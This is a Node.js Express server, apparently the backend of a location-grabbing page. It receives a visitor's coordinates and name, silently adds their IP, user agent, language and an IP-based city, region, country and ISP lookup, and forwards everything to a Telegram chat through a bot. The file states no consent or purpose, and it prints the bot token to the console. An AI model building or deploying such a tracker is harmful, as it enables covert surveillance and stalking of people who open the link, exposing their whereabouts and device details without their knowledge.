// server.js
require('dotenv').config();
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
app.set('trust proxy', true);
app.use(cors());
app.use(bodyParser.json());

// Servir ficheiros estáticos (como index.html) do diretório atual
app.use(express.static(__dirname));

// Rota principal (/) devolve index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
console.log(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);

app.get('/env.js', (req, res) => {
  res.type('application/javascript');
  res.send(`window.env = {
    ENDPOINT_URL: "${process.env.ENDPOINT_URL}"
  };`);
});
app.post("/send-location", async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const language = req.headers['accept-language'];
  console.log("Localização recebida:");
  console.log("IP:", ip);
  console.log("User-Agent:", userAgent);
  console.log("Language:", language);
  console.log("Body:", req.body);

  const { latitude, longitude, name } = req.body;

  if (!latitude || !longitude) {
    return res.status(400).json({ success: false, message: "Latitude e Longitude são obrigatórias!" });
  }

  let locationData = {};
  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    locationData = response.data;
  } catch (err) {
    console.error("Erro ao obter info do IP (ipapi.co):", err.message);
    try {
      const fallback = await axios.get(`http://ip-api.com/json/${ip}`);
      locationData = fallback.data;
    } catch (fallbackErr) {
      console.error("Fallback IP lookup failed:", fallbackErr.message);
    }
  }

  const message = `📍 Nova Localização Recebida:
👤 Nome: ${name || 'Não fornecido'}
🌍 IP: ${ip}
🧭 Latitude: ${latitude}
🧭 Longitude: ${longitude}
📱 User-Agent: ${userAgent || 'Não disponível'}
🗣️ Idioma: ${language || 'Não disponível'}
🏙️ Cidade: ${locationData.city || 'Desconhecida'}
📍 Região: ${locationData.region || locationData.regionName || 'Desconhecida'}
🌐 País: ${locationData.country_name || locationData.country || 'Desconhecido'}
📡 Operadora: ${locationData.org || locationData.isp || 'Desconhecida'}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});
